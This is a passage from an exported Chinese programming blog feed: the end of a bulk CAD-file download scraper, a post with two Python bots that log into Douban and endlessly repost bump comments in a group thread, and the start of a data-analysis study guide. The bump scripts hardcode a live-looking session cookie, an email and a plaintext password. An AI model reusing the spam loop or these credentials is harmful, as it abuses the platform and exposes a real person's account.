class="string">'%s%s.gif'</span>%(baseurl,<span class="string">'thumbs/'</span>+down_url)</span><br><span class="line">        download(category,file_name,pdf_url,dwg_url,gif_url)</span><br></pre></td></tr></table></figure><h2 id="多进程下载"><a href="#多进程下载" class="headerlink" title="多进程下载"></a>多进程下载</h2><pre><code class="bash">__author__ = <span class="string">'seven'</span>import requestsimport codecsimport jsonimport osimport refrom multiprocessing import Process<span class="string">''</span><span class="string">'</span><span class="string">分割任务多进程程下载</span><span class="string">'</span><span class="string">''</span>header = {    <span class="string">'Referer'</span>: <span class="string">'http://www.jameshardie.co.nz/specifiers/cad-library'</span>,    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36'</span>}baseurl = <span class="string">'http://cdnmaster.smartb.im/staging/td/jh/cadbim/'</span><span class="comment">##将要获取的数据源写入文件当中</span>def writedatatojson():    data_response = requests.get(<span class="string">'http://cdnmaster.smartb.im/staging/td/jh/scripts/databoom.js'</span>,headers = header)    datatable = re.search(<span class="string">'my.dt=(.)*;my'</span>,data_response.text).group(0).split(<span class="string">';my'</span>)[0]    datatable = json.loads(datatable[7:])    with codecs.open(<span class="string">'data.json'</span>, <span class="string">'w'</span>) as file:        file.write(json.dumps(datatable))        file.close()<span class="comment">##从文件当中获取json数据</span>def getdatafromjson():    with open(<span class="string">'data.json'</span>) as json_file:        data = json.load(json_file)        <span class="built_in">return</span> data<span class="comment">##下载文件</span>def download(datas,myrange):    <span class="keyword">for</span> order <span class="keyword">in</span> myrange:        data = datas[order]        category = data[-4]        file_name = str(data[-1]).replace(category + <span class="string">'/'</span>, <span class="string">''</span>)        down_url = str(data[-1])        <span class="comment"># pdf 下载链接</span>        pdf_url = <span class="string">'%s%s.pdf'</span> % (baseurl, <span class="string">'pdf/'</span> + down_url)        <span class="comment"># dwg下载链接</span>        dwg_url = <span class="string">'%s%s.dwg'</span> % (baseurl, <span class="string">'dwg/'</span> + down_url)        <span class="comment"># gif下载链接</span>        gif_url = <span class="string">'%s%s.gif'</span> % (baseurl, <span class="string">'thumbs/'</span> + down_url)        <span class="comment">#新建文件夹</span>        <span class="keyword">if</span> not os.path.exists(category):            os.makedirs(category)            <span class="built_in">print</span>(<span class="string">"创建文件夹成功"</span>)        <span class="comment">#下载pdf</span>        <span class="built_in">print</span>(<span class="string">"正在下载pdf"</span>)        pdf_response = requests.get(pdf_url,stream=True,headers = header)        with open(category+<span class="string">'/'</span>+file_name+<span class="string">'.pdf'</span>,<span class="string">'wb'</span>) as pdf_file:            pdf_file.write(pdf_response.content)        <span class="built_in">print</span>(<span class="string">"pdf下载完成"</span>)        <span class="built_in">print</span>(<span class="string">"正在下载dwg"</span>)        dwg_response = requests.get(dwg_url,stream=True,headers = header)        with open(category+<span class="string">'/'</span>+file_name + <span class="string">'.dwg'</span>, <span class="string">'wb'</span>) as dwg_file:            dwg_file.write(dwg_response.content)        <span class="built_in">print</span>(<span class="string">"dwg下载完成"</span>)        <span class="built_in">print</span>(<span class="string">"正在下载gif"</span>)        gif_response = requests.get(gif_url,stream=True,headers = header)        with open(category+<span class="string">'/'</span>+file_name + <span class="string">'.gif'</span>, <span class="string">'wb'</span>) as gif_file:            gif_file.write(gif_response.content)        <span class="built_in">print</span>(<span class="string">"gif下载完成"</span>)<span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:    writedatatojson()    step = 100    datas = getdatafromjson()    blocks = range(1,len(datas)+1)    <span class="comment">##将数据分段，实行多线程下载</span>    range_lists = [blocks[x:x + step] <span class="keyword">for</span> x <span class="keyword">in</span> range(0, len(blocks), step)]    processlist = []    <span class="keyword">for</span> range_list <span class="keyword">in</span> range_lists:        p = Process(target=download,args=(datas,range_list))        processlist.append(p)    <span class="keyword">for</span> p <span class="keyword">in</span> processlist:        p.start()</code></pre><p>源码可以戳<a href="https://github.com/shisiying/crawer_python/blob/master/pdfdownload/pdfdown_mutiprocess.py" target="_blank" rel="noopener">这里</a></p>]]></content>
      
      
      <categories>
          
          <category> 项目 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>豆瓣自动顶贴</title>
      <link href="/2017/11/07/%E8%B1%86%E7%93%A3%E8%87%AA%E5%8A%A8%E9%A1%B6%E8%B4%B4/"/>
      <url>/2017/11/07/%E8%B1%86%E7%93%A3%E8%87%AA%E5%8A%A8%E9%A1%B6%E8%B4%B4/</url>
      
        <content type="html"><![CDATA[<p>豆瓣自动顶贴<br><a id="more"></a></p><h2 id="Todo"><a href="#Todo" class="headerlink" title="Todo"></a>Todo</h2><p>[X] 模擬登陸<br>[x] 自動加入小組<br>[x] 循環打鐵<br>[ ] 接入自動打碼平臺</p><hr><h2 id="version1-直接从浏览器拿cookies-实现人工打码"><a href="#version1-直接从浏览器拿cookies-实现人工打码" class="headerlink" title="version1,直接从浏览器拿cookies,实现人工打码"></a>version1,直接从浏览器拿cookies,实现人工打码</h2><hr><p>代码如下所示:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">import requests</span><br><span class="line">from PIL import Image as Img</span><br><span class="line"></span><br><span class="line"><span class="comment">#登录豆瓣网站通过浏览器获取</span></span><br><span class="line">cookie=<span class="string">'bid=KK2hxqpBaU0; __utma=30149280.587038371.1494914965.1495184031.1510058780.6; __utmz=30149280.1510058780.6.4.utmcsr=douban.com|utmccn=(referral)|utmcmd=referral|utmcct=/accounts/login; _pk_ref.100001.8cb4=%5B%22%22%2C%22%22%2C1510058607%2C%22https%3A%2F%2Fmusic.douban.com%2F%22%5D; _pk_id.100001.8cb4=73bd3e0f43a9ec86.1494991646.2.1510059381.1494991646.; ll="118297"; _vwo_uuid_v2=7C7CF1E47D4AA8D34F5C77B98A9B153C|75a543efa3eaeec8ce636b55f5471eaa; ap=1; ps=y; ue="751401459@qq.com"; dbcl2="126307671:BL/RMuRq7Ms"; ck=dSI3; _pk_ses.100001.8cb4=*; push_noty_num=0; push_doumail_num=0; __utmb=30149280.51.5.1510059281014; __utmc=30149280; __utmv=30149280.12630; __yadk_uid=c0i8yPs8Xpd4NLcPh2svCYWhXdP4bvgN'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#小组贴的url</span></span><br><span class="line">baseurl=<span class="string">'https://www.douban.com/group/topic/109369863/'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#顶贴的时间间隔,单位秒</span></span><br><span class="line">time_interval=60</span><br><span class="line"></span><br><span class="line"><span class="comment"># 小组评论提交的地址</span></span><br><span class="line">url = baseurl+<span class="string">'add_comment'</span></span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36'</span>,</span><br><span class="line">    <span class="string">'Cookie'</span>:str(cookie)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">##循环顶贴次数</span></span><br><span class="line">count = 1</span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    <span class="comment">##在控制台查看顶贴的次数</span></span><br><span class="line">    <span class="built_in">print</span> (<span class="string">'我再顶'</span> + str(count))</span><br><span class="line">    <span class="comment">##提交的数据</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">"rv_comment"</span>: <span class="string">'ding'</span> + str(count),</span><br><span class="line">        <span class="string">"ck"</span>: <span class="string">"aubV"</span>,</span><br><span class="line">        <span class="string">'start'</span>: <span class="string">'0'</span>,</span><br><span class="line">        <span class="string">'submit_btn'</span>: <span class="string">'加上去'</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> True:</span><br><span class="line">        rval = requests.get(baseurl+<span class="string">'?start=5000#last'</span>,headers=header)</span><br><span class="line">        <span class="comment">#检验是否需要输入验证码?</span></span><br><span class="line">        import re</span><br><span class="line">        <span class="comment">##寻找要提交的ck参数</span></span><br><span class="line">        data[<span class="string">'ck'</span>] = re.search(<span class="string">'source=group&amp;ck=(\w+)'</span>, rval.text).group(1)</span><br><span class="line">        captcha_need = re.search(<span class="string">'src=\"(.*captcha.*)+\"'</span>, rval.text)</span><br><span class="line">        <span class="comment">#需要验证输入验证码</span></span><br><span class="line">        <span class="keyword">if</span> captcha_need!=None:</span><br><span class="line">            mat = re.search(<span class="string">'src=\"(.*captcha.*)+\"'</span>, rval.text).group(1).split(<span class="string">' '</span>)</span><br><span class="line">            <span class="comment">#验证码url</span></span><br><span class="line">            img_url=mat[0]</span><br><span class="line">            <span class="comment">#验证码隐藏域</span></span><br><span class="line">            captcha_id=re.split(<span class="string">'&amp;'</span>,img_url)[0].split(<span class="string">'='</span>)[1]</span><br><span class="line">            <span class="keyword">if</span> mat:</span><br><span class="line">                with open(<span class="string">'code.jpg'</span>, <span class="string">'wb'</span>) as f:</span><br><span class="line">                    f.write(requests.get(img_url).content)</span><br><span class="line">                try:</span><br><span class="line">                    img = Img.open(<span class="string">'code.jpg'</span>)</span><br><span class="line">                    img.show()</span><br><span class="line">                    img.close()</span><br><span class="line">                except:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">'图片打开失败'</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    veri_code_input = input(<span class="string">'输入验证码:'</span>)</span><br><span class="line">                    <span class="comment">#构造验证码提交的数据</span></span><br><span class="line">                    data_captcha = &#123;</span><br><span class="line">                        <span class="string">"rv_comment"</span>: <span class="string">'有验证码我也顶'</span> + str(count),</span><br><span class="line">                        <span class="string">"ck"</span>:  data[<span class="string">'ck'</span>],</span><br><span class="line">                        <span class="string">'start'</span>: <span class="string">'0'</span>,</span><br><span class="line">                        <span class="string">'submit_btn'</span>: <span class="string">'加上去'</span>,</span><br><span class="line">                        <span class="string">'captcha-solution'</span>:veri_code_input,</span><br><span class="line">                        <span class="string">'captcha-id'</span>: captcha_id</span><br><span class="line">                    &#125;</span><br><span class="line">                    rval = requests.post(url=url, data=data_captcha, headers=header)</span><br><span class="line">                    <span class="built_in">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#不需要验证码的时候，直接提交</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            rval = requests.post(url=url, data=data, headers=header)</span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line"></span><br><span class="line">    import time</span><br><span class="line">    time.sleep(time_interval)</span><br><span class="line">    count+=1</span><br></pre></td></tr></table></figure><hr><h2 id="version2-直接模拟登陆豆瓣，拿取cookie-也接入人工打码"><a href="#version2-直接模拟登陆豆瓣，拿取cookie-也接入人工打码" class="headerlink" title="version2 直接模拟登陆豆瓣，拿取cookie,也接入人工打码"></a>version2 直接模拟登陆豆瓣，拿取cookie,也接入人工打码</h2><hr><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">from PIL import Image</span><br><span class="line">import re</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36'</span>,</span><br><span class="line">    <span class="string">'Referer'</span>:<span class="string">'https://accounts.douban.com/login?alias=&amp;redir=https%3A%2F%2Fwww.douban.com%2F&amp;source=index_nav&amp;error=1001'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 帖子的连接</span></span><br><span class="line">bash_url = <span class="string">'https://www.douban.com/group/topic/109369863/'</span></span><br><span class="line"></span><br><span class="line">def login(username,passwd,url=<span class="string">'https://accounts.douban.com/login'</span>):</span><br><span class="line">    <span class="string">''</span><span class="string">'</span></span><br><span class="line"><span class="string">    模拟登陆豆瓣</span></span><br><span class="line"><span class="string">    :param username: username</span></span><br><span class="line"><span class="string">    :param passwd: passwd</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    '</span><span class="string">''</span></span><br><span class="line">    caprcha_id,veri_code_url = verification_code(url)</span><br><span class="line">    <span class="comment"># 判断是否需要验证码</span></span><br><span class="line">    <span class="keyword">if</span> veri_code_url != None:</span><br><span class="line">        with open(<span class="string">'code1.jpg'</span>,<span class="string">'wb'</span>) as f:</span><br><span class="line">            f.write(requests.get(veri_code_url).content)</span><br><span class="line">        try:</span><br><span class="line">            img = Image.open(<span class="string">'code1.jpg'</span>)</span><br><span class="line">            img.show()</span><br><span class="line">            img.close()</span><br><span class="line">        except:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">'图片打开失败'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            veri_code_input = input(<span class="string">'输入验证码:'</span>)</span><br><span class="line"></span><br><span class="line">    post_data = &#123;</span><br><span class="line">        <span class="string">'source'</span>: <span class="string">'index_nav'</span>,</span><br><span class="line">        <span class="string">'redir'</span>: <span class="string">'https://www.douban.com/'</span> ,</span><br><span class="line">        <span class="string">'form_email'</span>: username,</span><br><span class="line">        <span class="string">'form_password'</span>: passwd,</span><br><span class="line">        <span class="string">'login'</span>: <span class="string">'登陆'</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> caprcha_id != None:</span><br><span class="line">        post_data[<span class="string">'captcha-id'</span>]= caprcha_id</span><br><span class="line">        post_data[<span class="string">'captcha-solution'</span>] = veri_code_input</span><br><span class="line"></span><br><span class="line">    session = requests.session()</span><br><span class="line">    session.post(url,data  = post_data,headers = headers)</span><br><span class="line">    <span class="built_in">return</span> session</span><br><span class="line"></span><br><span class="line">def verification_code(url):</span><br><span class="line"></span><br><span class="line">    <span class="string">''</span><span class="string">'</span></span><br><span class="line"><span class="string">    判断是否需要输入验证码</span></span><br><span class="line"><span class="string">    :param url: 登陆的URL</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    '</span><span class="string">''</span></span><br><span class="line"></span><br><span class="line">    bsobj = BeautifulSoup(requests.get(url).text,<span class="string">'lxml'</span>)</span><br><span class="line">    try:</span><br><span class="line">        ver_code_link  =  bsobj.find(<span class="string">'img'</span>,id=<span class="string">'captcha_image'</span>)[<span class="string">'src'</span>]</span><br><span class="line">        caprcha_id = bsobj.find(<span class="string">'div'</span>,&#123;<span class="string">'class'</span>:<span class="string">'captcha_block'</span>&#125;).find_all(<span class="string">'input'</span>)[1][<span class="string">'value'</span>]</span><br><span class="line">    except BaseException:</span><br><span class="line">        <span class="built_in">return</span> None,None</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">return</span> caprcha_id,ver_code_link</span><br><span class="line"></span><br><span class="line">def get_group_url():</span><br><span class="line">    <span class="string">''</span><span class="string">'</span></span><br><span class="line"><span class="string">    得到小组的链接，判断是否加入小组。</span></span><br><span class="line"><span class="string">    :return: group_url</span></span><br><span class="line"><span class="string">    '</span><span class="string">''</span></span><br><span class="line">    bsobj = BeautifulSoup(requests.get(bash_url,headers = headers).text,<span class="string">'lxml'</span>)</span><br><span class="line">    group_url = bsobj.find(<span class="string">'div'</span>,&#123;<span class="string">'class'</span>:<span class="string">'title'</span>&#125;).find(<span class="string">'a'</span>)[<span class="string">'href'</span>]</span><br><span class="line">    <span class="built_in">return</span> group_url</span><br><span class="line"></span><br><span class="line">def join_the_group(session):</span><br><span class="line">    <span class="string">''</span><span class="string">'</span></span><br><span class="line"><span class="string">    判断是否加入这个小组，未加入则无法正常回帖!</span></span><br><span class="line"><span class="string">    :param group_url: 小组连接</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    '</span><span class="string">''</span></span><br><span class="line">    group_url = get_group_url()</span><br><span class="line">    bsobj = BeautifulSoup(session.get(group_url).text,<span class="string">'lxml'</span>)</span><br><span class="line">    try:</span><br><span class="line">        <span class="comment"># 未加入小组</span></span><br><span class="line">        join_group = bsobj.find(<span class="string">'a'</span>, &#123;<span class="string">'class'</span>: <span class="string">'bn-join-group'</span>&#125;)</span><br><span class="line">        join_group_text = join_group.find(<span class="string">'span'</span>).text</span><br><span class="line">    except:</span><br><span class="line">        <span class="comment"># 已经加入小组</span></span><br><span class="line">        in_group = bsobj.find(<span class="string">'div'</span>,&#123;<span class="string">'class'</span>:<span class="string">'group-misc'</span>&#125;).text</span><br><span class="line">        <span class="built_in">print</span>(in_group.replace(<span class="string">' '</span>, <span class="string">''</span>)[:-6])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 请求加入小组URL</span></span><br><span class="line">        <span class="keyword">if</span> join_group_text == <span class="string">'加入小组'</span>:</span><br><span class="line">            session.get(join_group[<span class="string">'href'</span>])</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">'你已经加入小组'</span>)</span><br><span class="line"></span><br><span class="line">def replies(session):</span><br><span class="line">    url = bash_url+<span class="string">'add_comment'</span></span><br><span class="line">    count = 1</span><br><span class="line">    <span class="keyword">while</span> True:</span><br><span class="line">        <span class="comment">##在控制台查看顶贴的次数</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">'我再顶'</span> + str(count))</span><br><span class="line">        <span class="comment">##提交的数据</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"rv_comment"</span>: <span class="string">'ding'</span> + str(count),</span><br><span class="line">            <span class="string">"ck"</span>: <span class="string">"aubV"</span>,</span><br><span class="line">            <span class="string">'start'</span>: <span class="string">'0'</span>,</span><br><span class="line">            <span class="string">'submit_btn'</span>: <span class="string">'加上去'</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> True:</span><br><span class="line">            rval = session.get(bash_url + <span class="string">'?start=5000#last'</span>, headers=headers)</span><br><span class="line">            <span class="comment"># 检验是否需要输入验证码?</span></span><br><span class="line">            import re</span><br><span class="line">            <span class="comment">##寻找要提交的ck参数</span></span><br><span class="line">            data[<span class="string">'ck'</span>] = re.search(<span class="string">'ck=(\w+)'</span>, rval.text).group(1)</span><br><span class="line"></span><br><span class="line">            captcha_need = re.search(<span class="string">'src=\"(.*captcha.*)+\"'</span>, rval.text)</span><br><span class="line">            <span class="comment"># 需要验证输入验证码</span></span><br><span class="line">            <span class="keyword">if</span> captcha_need != None:</span><br><span class="line">                mat = re.search(<span class="string">'src=\"(.*captcha.*)+\"'</span>, rval.text).group(1).split(<span class="string">' '</span>)</span><br><span class="line">                <span class="comment"># 验证码url</span></span><br><span class="line">                img_url = mat[0]</span><br><span class="line">                <span class="comment"># 验证码隐藏域</span></span><br><span class="line">                captcha_id = re.split(<span class="string">'&amp;'</span>, img_url)[0].split(<span class="string">'='</span>)[1]</span><br><span class="line">                <span class="keyword">if</span> mat:</span><br><span class="line">                    with open(<span class="string">'code.jpg'</span>, <span class="string">'wb'</span>) as f:</span><br><span class="line">                        f.write(requests.get(img_url).content)</span><br><span class="line">                    try:</span><br><span class="line">                        img = Image.open(<span class="string">'code.jpg'</span>)</span><br><span class="line">                        img.show()</span><br><span class="line">                        img.close()</span><br><span class="line">                    except:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">'图片打开失败'</span>)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        veri_code_input = input(<span class="string">'输入验证码:'</span>)</span><br><span class="line">                        <span class="comment"># 构造验证码提交的数据</span></span><br><span class="line">                        data_captcha = &#123;</span><br><span class="line">                            <span class="string">"rv_comment"</span>: <span class="string">'有验证码我也顶'</span> + str(count),</span><br><span class="line">                            <span class="string">"ck"</span>: data[<span class="string">'ck'</span>],</span><br><span class="line">                            <span class="string">'start'</span>: <span class="string">'0'</span>,</span><br><span class="line">                            <span class="string">'submit_btn'</span>: <span class="string">'加上去'</span>,</span><br><span class="line">                            <span class="string">'captcha-solution'</span>: veri_code_input,</span><br><span class="line">                            <span class="string">'captcha-id'</span>: captcha_id</span><br><span class="line">                        &#125;</span><br><span class="line">                        session.post(url=url, data=data_captcha, headers=headers)</span><br><span class="line">                        <span class="built_in">break</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 不需要验证码的时候，直接提交</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                session.post(url=url, data=data, headers=headers)</span><br><span class="line">                <span class="built_in">break</span></span><br><span class="line">        count += 1</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">'等待20秒'</span>)</span><br><span class="line">        time.sleep(20)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    douban_session = login(</span><br><span class="line">        username=<span class="string">'wzw1551**28333@gmail.com'</span>,</span><br><span class="line">        passwd=<span class="string">'wang0302'</span></span><br><span class="line">    )</span><br><span class="line">    join_the_group(douban_session)</span><br><span class="line">    replies(douban_session)</span><br></pre></td></tr></table></figure><hr><hr><p>效果图：<br><img src="验证码.png" alt=""></p><h2 id=""><a href="#" class="headerlink" title=""></a><img src="顶贴.png" alt=""></h2>]]></content>
      
      
      <categories>
          
          <category> 项目 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>系统学习python有关数据分析和挖掘相关的库</title>
      <link href="/2017/11/06/%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0python%E6%9C%89%E5%85%B3%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E5%92%8C%E6%8C%96%E6%8E%98%E7%9B%B8%E5%85%B3%E7%9A%84%E5%BA%93/"/>
      <url>/2017/11/06/%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0python%E6%9C%89%E5%85%B3%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E5%92%8C%E6%8C%96%E6%8E%98%E7%9B%B8%E5%85%B3%E7%9A%84%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>社会发展太快了，早几年web开发发展猛如虎，现在也差不多收一波了，人工智能时代也很火热，对码农的要求也原来越高，多学点肯定是没有错的，很火热的python数据分析和挖掘也应该即使跟上脚步学习，防止被这“乱世”所淘汰。<br>资料以及各种经验分享摘自网上，本人做汇总，仅供学习参考。有了目标跟计划，学东西起来就会的得心应手一些。</p><h2 id="数据分析与机器学习workflow"><a href="#数据分析与机器学习workflow" class="headerlink" title="数据分析与机器学习workflow"></a>数据分析与机器学习workflow</h2><p>如果要系统地学习Python中有关数据分析&amp;挖掘相关的库，那么pandas, numpy, scipy, matplotlib, 以及scikit-learn就是知识框架体系中的必备部分: </p><p>pandas用来做数据处理<br>numpy用来做高维度矩阵运算<br>scipy用来做科学计算<br>matplotlib用来做数据可视化<br>scikit-learn用来做机器学习与数据挖掘。</p><p>上面这几个库也就搭建了做数据分析&amp;挖掘的经典workflow:</p><p>拿到数据之后先要做一个数据的预处理(pandas+numpy+scipy)<br>接着会要对数据包含的特征做一些可视化输出(matplotlib)<br>之后需要提取特征&amp;建模调参(numpy+scikit-learn)<br>有了模型与结果，最后归纳整理做presentation &amp; report.</p><p>做数据挖掘，对于数学&amp;统计方面还是有很高的要求，<br>至少对于线性代数，概率论与数理统计，机器学习都要有一定程度的掌握。<br>比如：在做数据挖掘项目的时候，scikit-learn库里面已经涵盖了基本的算法。<br>对于特征、模型与算法的选择，一方面是书本知识的累积，<br>你要掌握解决哪一类问题用什么类型的算法，而在具体问题时如何调用算法，则是要反复实践的</p><h2 id="入门学习轨迹"><a href="#入门学习轨迹" class="headerlink" title="入门学习轨迹"></a>入门学习轨迹</h2><p>1.Numpy：来存储和处理大型矩阵，比Python自身的嵌套列表（nested list structure)结构要高效的多，本身是由C语言开发。这个是很基础的扩展，其余的扩展都是以此为基础。数据结构为ndarray,一般有三种方式来创建。</p><p>Python对象的转换</p><p>通过类似工厂函数numpy内置函数生成：np.arange,np.linspace等等</p><p>从硬盘读取，loadtxt</p><p>2.Pandas:</p><p>基于NumPy 的一种工具，该工具是为了解决数据分析任务而创建的。<br>Pandas 